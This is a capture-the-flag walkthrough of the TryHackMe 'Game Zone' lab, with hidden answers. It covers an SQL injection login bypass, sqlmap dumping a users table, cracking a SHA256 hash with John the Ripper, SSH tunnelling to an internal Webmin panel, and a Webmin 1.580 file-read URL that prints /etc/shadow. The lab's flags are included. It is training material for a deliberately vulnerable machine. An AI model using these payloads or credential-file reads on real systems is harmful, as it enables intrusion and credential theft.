# Game Zone — TryHackMe Walkthrough

> Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!

<p align="center">
<a href="https://tryhackme.com/room/gamezone"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/f840de8ced2851ef65e39bf9d809751e.jpeg" alt="Game Zone" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/gamezone">
    <img src="https://img.shields.io/badge/TryHackMe-Game%20Zone-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-SQLi%20%7C%20Hash%20Cracking%20%7C%20SSH%20Tunneling%20%7C%20Webmin%20RCE-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | SQL Injection (Manual and SQLMap) |
| 2 | Hash Cracking with John the Ripper |
| 3 | SSH Tunneling to Expose Internal Services |
| 4 | Privileged Remote Code Execution via Webmin |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Manually exploit a SQL injection vulnerability to bypass authentication
- Use SQLMap with a captured Burp Suite request to dump a MySQL database
- Crack a SHA256 password hash using John the Ripper and rockyou.txt
- Use `ss` to discover internally listening services hidden from the outside
- Create a local SSH tunnel to expose an internal service in your browser
- Exploit a vulnerable Webmin installation to achieve root-level code execution

---

## Prerequisites

- Basic familiarity with Linux terminal commands and SQL concepts
- Nmap, SQLMap, John the Ripper, Burp Suite, and Metasploit installed

---

## Task 1 — Deploy the Vulnerable Machine

### Task 1.1 — Deploy the machine

**Approach:** Start the machine from the TryHackMe room page and navigate to the web server in your browser once it is up.

> **Note:** The web server hosts a game review forum. Take note of the large cartoon avatar on the homepage — it will answer the first question.

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

---

### Task 1.2 — What is the name of the large cartoon avatar holding a sniper on the forum?

> **Note:** The homepage features a well-known video game character used as the forum mascot. This is a recognition question — no exploitation required.

<details><summary>Reveal Answer</summary>

`Agent 47`

</details>

---

## Task 2 — Obtain Access via SQLi

### Task 2.1 — Understanding SQL Injection

**Approach:** The login form passes user input directly into the following SQL query without sanitisation:

```sql
SELECT * FROM users WHERE username = :username AND password := password
```

When user input is inserted into a query without sanitisation, an attacker can inject additional SQL syntax to alter the query's logic.

> **Note:** SQL injection occurs when user-controlled input is concatenated into a SQL statement rather than being passed as a safe parameterised value. The injected payload can comment out parts of the query, introduce always-true conditions, or extract data from the database entirely.

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

---

### Task 2.2 — Bypass authentication with SQLi

**Approach:** Use `' or 1=1 -- -` as the username and leave the password field blank. The resulting query becomes:

```sql
SELECT * FROM users WHERE username = '' or 1=1 -- - AND password := ''
```

The `or 1=1` condition is always true, and `-- -` comments out the rest of the query — bypassing the password check entirely.

> **Note:** GameZone has no `admin` user in the database, so entering `admin` as the username would fail. Using the injection payload as the username itself causes the query to return the first row in the users table regardless of credentials. After a successful login, the server redirects to the portal page.

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

---

### Task 2.3 — When logged in, what page do you get redirected to?

<details><summary>Reveal Answer</summary>

`portal.php`

</details>

---

## Task 3 — Using SQLMap

### Step 1 — Intercepting the Search Request with Burp Suite

**Approach:** Log in using the SQL injection bypass, then navigate to the game review search feature on `portal.php`. Intercept the search POST request in Burp Suite and save it to a file (e.g. `r.txt`). Pass this file to SQLMap to automate injection testing against the authenticated session.

<p align="center"><img src="https://i.imgur.com/ox4wJVH.png" /></p>

Save the intercepted request:

<p align="center"><img src="https://i.imgur.com/W5boKpk.png" /></p>

Run SQLMap against the saved request:

```
kali@kali:~/CTFs/tryhackme/Game Zone$ sqlmap -r r.txt --dbms=mysql --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.9#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 23:18:52 /2020-11-18/

[23:18:52] [INFO] parsing HTTP request from 'r.txt'
[23:18:54] [INFO] testing connection to the target URL
[23:18:54] [INFO] checking if the target is protected by some kind of WAF/IPS
[23:18:54] [INFO] testing if the target URL content is stable
[23:18:54] [INFO] target URL content is stable
[23:18:54] [INFO] testing if POST parameter 'searchitem' is dynamic
[23:18:55] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
[23:18:55] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
[23:18:55] [INFO] testing for SQL injection on POST parameter 'searchitem'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
[23:19:03] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="11")
[23:19:13] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[23:19:14] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable

sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=-9825' OR 6756=6756#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=asd' AND GTID_SUBSET(CONCAT(0x71766b7671,(SELECT (ELT(9889=9889,1))),0x717a6a7871),9889)-- LkWM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=asd' AND (SELECT 7029 FROM (SELECT(SLEEP(5)))XsZa)-- xNqa

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: searchitem=asd' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7671,0x51684e765374496678556c694b5147494d786c42476c4573746f584d575143526965614d6253496e,0x717a6a7871)#
---
back-end DBMS: MySQL >= 5.6
[23:22:10] [INFO] fetching tables for database: 'db'
[23:22:10] [INFO] fetching columns for table 'post' in database 'db'
[23:22:10] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[23:22:10] [INFO] fetching columns for table 'users' in database 'db'
[23:22:10] [INFO] fetching entries for table 'users' in database 'db'
[23:22:10] [INFO] recognized possible password hashes in column 'pwd'
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[*] ending @ 23:23:07 /2020-11-18/
```

> **Note:** SQLMap automatically tries boolean-based blind, error-based, time-based blind, and UNION query injection techniques. All four succeed here. The `-r` flag passes the full authenticated Burp Suite request including cookies, ensuring SQLMap operates within a valid session. The `--dump` flag extracts all table contents. Two tables are found in the `db` database: `post` (game reviews) and `users` (credentials). The `users` table contains one entry — a SHA256 password hash for `agent47`.

---

### Task 3.1 — In the users table, what is the hashed password?

<details><summary>Reveal Answer</summary>

`ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

</details>

---

### Task 3.2 — What was the username associated with the hashed password?

<details><summary>Reveal Answer</summary>

`agent47`

</details>

---

### Task 3.3 — What was the other table name?

<details><summary>Reveal Answer</summary>

`post`

</details>

---

## Task 4 — Cracking a Password with John the Ripper

### Step 2 — Cracking the SHA256 Hash

**Approach:** Save the recovered hash to a file and pass it to John the Ripper with `rockyou.txt` as the wordlist. Specify `Raw-SHA256` as the hash format. John works by hashing each word in the wordlist and comparing it to the target hash — when they match, the plaintext is found.

<p align="center"><img src="https://i.imgur.com/64g6Y8F.png" /></p>

```
kali@kali:~/CTFs/tryhackme/Game Zone$ john agent47.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (?)
1g 0:00:00:00 DONE (2020-11-18 23:25) 1.136g/s 3351Kp/s 3351Kc/s 3351KC/s vimivi..vainlove
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

> **Note:** The hash cracks almost instantly because the password appears in `rockyou.txt`. SHA256 is a cryptographic hash — it cannot be reversed mathematically. John must re-hash every word in the wordlist until it finds one that produces the same hash. The `--format=Raw-SHA256` flag is required because John supports many hash types and needs to know which algorithm to use.

---

### Task 4.1 — What is the de-hashed password?

<details><summary>Reveal Answer</summary>

`videogamer124`

</details>

---

### Step 3 — SSH Login and User Flag

**Approach:** Use the cracked credentials to SSH in as `agent47` and read the user flag.

```
kali@kali:~/CTFs/tryhackme/Game Zone$ ssh agent47@Machine_IP
agent47@Machine_IP's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ ls -la
total 28
drwxr-xr-x 3 agent47 agent47 4096 Aug 16  2019 .
drwxr-xr-x 3 root    root    4096 Aug 14  2019 ..
lrwxrwxrwx 1 root    root       9 Aug 16  2019 .bash_history -> /dev/null
-rw-r--r-- 1 agent47 agent47  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 agent47 agent47 3771 Aug 14  2019 .bashrc
drwx------ 2 agent47 agent47 4096 Aug 16  2019 .cache
-rw-r--r-- 1 agent47 agent47  655 Aug 14  2019 .profile
-rw-rw-r-- 1 agent47 agent47   33 Aug 16  2019 user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
```

> **Note:** `.bash_history` is symlinked to `/dev/null` — meaning all command history is silently discarded. This is a common anti-forensics measure on CTF machines but is also seen on real hardened systems. The user flag is world-readable in the home directory.

---

### Task 4.2 — What is the user flag?

<details><summary>Reveal Answer</summary>

`649ac17b1480ac13ef1e4fa579dac95c`

</details>

---

## Task 5 — Exposing Services with Reverse SSH Tunnels

### Step 4 — Discovering Internal Services with ss

**Approach:** Use `ss -tulpn` to list all listening sockets on the machine. This reveals services that are running internally but blocked from external access by firewall rules.

<p align="center"><img src="https://i.imgur.com/cYZsC8p.png" /></p>

```
agent47@gamezone:~$ ss -tulpn
Netid  State      Recv-Q Send-Q                                Local Address:Port                                               Peer Address:Port
udp    UNCONN     0      0                                                 *:10000                                                         *:*
udp    UNCONN     0      0                                                 *:68                                                            *:*
tcp    LISTEN     0      80                                        127.0.0.1:3306                                                          *:*
tcp    LISTEN     0      128                                               *:10000                                                         *:*
tcp    LISTEN     0      128                                               *:22                                                            *:*
tcp    LISTEN     0      128                                              :::80                                                           :::*
tcp    LISTEN     0      128                                              :::22                                                           :::*
```

> **Note:** Five TCP sockets are listening. Port **3306** (MySQL) is bound to `127.0.0.1` — only accessible locally. Port **10000** is listening on all interfaces but is blocked externally by a firewall rule. This is where a web application is hidden. An SSH tunnel will let us reach it from our local browser as if we were on the machine itself.

---

### Task 5.1 — How many TCP sockets are running?

<details><summary>Reveal Answer</summary>

`5`

</details>

---

### Step 5 — Creating an SSH Local Tunnel to Port 10000

**Approach:** From your local machine, create an SSH local port forward that maps your local port 10000 to the target's port 10000 via the SSH connection. Once the tunnel is active, browse to `http://localhost:10000` to access the hidden service.

```
ssh -L 10000:localhost:10000 agent47@Machine_IP
```

Then open `http://localhost:10000` in your browser.

<p align="center"><img src="https://i.imgur.com/9vJZUZv.png" /></p>

> **Note:** The `-L` flag creates a **local tunnel** — traffic sent to your local port 10000 is forwarded through the encrypted SSH connection to `localhost:10000` on the remote machine. From the web server's perspective, the request comes from `127.0.0.1` — bypassing the firewall rule that blocks external access. The page that loads reveals a **Webmin** administration panel.

---

### Task 5.2 — What is the name of the exposed CMS?

<details><summary>Reveal Answer</summary>

`Webmin`

</details>

---

### Task 5.3 — What is the CMS version?

> **Note:** The Webmin version is visible in the footer or login page of the panel once the tunnel is active. Note this version number carefully — it determines which exploit to use in the next task.

<details><summary>Reveal Answer</summary>

`1.580`

</details>

---

## Task 6 — Privilege Escalation with Metasploit

### Step 6 — Exploiting Webmin 1.580 for Root Access

**Approach:** Webmin 1.580 is vulnerable to an authenticated remote code execution exploit. Use Metasploit to find and run the appropriate module against `localhost:10000` through the active SSH tunnel. The Webmin file manager also exposes a direct file read endpoint — use it to verify root-level file access.

Reading `/etc/shadow` through the Webmin file endpoint to confirm root-level access:

```
http://localhost:10000/file/show.cgi/etc/shadow
```

```
root:$6$Llhg4MdC$f9TRe8xLelwHpj5JvCNprpWBnHppEnryPo1mGiKW2U71SpTVZRRE0f7/3kZsIwNsRpcc7GlcVSnuYfiN5n7Yw.:18124:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
lxd:*:18122:0:99999:7:::
messagebus:*:18122:0:99999:7:::
uuidd:*:18122:0:99999:7:::
dnsmasq:*:18122:0:99999:7:::
sshd:*:18122:0:99999:7:::
agent47:$6$QRnDATVa$Dhv2K3GVe40X5hxB/vrdBeBDOYwtwGzFZfEL6/MdvOyO6S2w6pmaZy/h4j.3DKrCGtXoqkVTy.PDJsuOeZ6In1:18124:0:99999:7:::
mysql:!:18122:0:99999:7:::
```

Reading the root flag directly:

```
http://localhost:10000/file/show.cgi/root/root.txt
```

> **Note:** Webmin 1.580 contains an authenticated arbitrary file read and remote code execution vulnerability documented at [Exploit-DB](https://www.exploit-db.com/exploits/46694) and in the AISG research dossier. Because the SSH tunnel makes `localhost:10000` reachable from our machine, Metasploit can target it directly. Webmin runs as root, so any code execution or file read through it operates with full system privileges — including reading `/etc/shadow` and `/root/root.txt` without needing a traditional shell.

---

### Task 6.1 — What is the root flag?

<details><summary>Reveal Answer</summary>

`a4b945830144bdd71908d12d902adeee`

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Identified forum mascot on homepage | Answered recognition question |
| 2 | SQL injection bypass on login form | Authenticated without credentials; redirected to `portal.php` |
| 3 | SQLMap with Burp Suite request dump | Extracted `users` and `post` tables from MySQL database `db` |
| 4 | John the Ripper SHA256 crack with rockyou.txt | Recovered plaintext password for `agent47` |
| 5 | SSH login as `agent47` | Retrieved user flag |
| 6 | `ss -tulpn` socket enumeration | Discovered Webmin running internally on port 10000 |
| 7 | SSH local tunnel `-L 10000:localhost:10000` | Exposed Webmin 1.580 panel in local browser |
| 8 | Webmin 1.580 file read and Metasploit RCE | Retrieved root flag via root-level file access |
